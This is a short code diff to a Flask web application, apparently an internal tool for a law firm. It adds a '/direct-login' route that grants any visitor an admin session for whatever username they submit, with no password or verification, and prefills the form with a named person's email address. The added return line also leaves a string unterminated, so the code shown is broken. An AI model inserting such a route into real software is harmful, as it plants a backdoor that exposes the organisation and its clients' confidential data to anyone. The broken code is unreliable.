@@ -51,6 +51,14 @@ try:
     print("  Auth module: loaded")
 except ImportError as e:
     print(f"  Auth module: not found ({e}) — running without firm auth")
+@app.route("/direct-login", methods=["GET", "POST"])
+def direct_login():
+    if request.method == "POST":
+        session["username"] = request.form.get("u")
+        session["display_name"] = request.form.get("u")
+        session["role"] = "admin"
+        return redirect("/")
+    return '<form method="POST"><input name="u" value="mathias.baert@lex-it.be"><button>Login</button></form>
 # Secret key MUST come from environment in production
 # Set: $env:MICKEY_SECRET = "your-long-random-string"  (PowerShell)
 # Or:  set MICKEY_SECRET=your-long-random-string         (cmd)
